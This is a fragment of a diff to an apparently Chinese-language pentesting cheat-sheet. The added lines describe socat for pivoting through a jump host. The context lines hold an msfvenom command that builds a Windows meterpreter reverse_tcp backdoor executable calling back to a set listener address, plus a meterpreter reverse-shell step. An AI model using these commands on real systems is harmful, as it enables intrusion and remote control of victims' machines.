@@ -145,6 +145,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 meterpreter > shell      获得 反向 shell
 
 
+Socat 是一个双向中继工具，可以在 2 个独立的网络通道之间创建管道套接字，在本机监听，在跳板机上启动
+  https://linux.die.net/man/1/socat
+
+
+
+
 
 
 msf bind-shell:
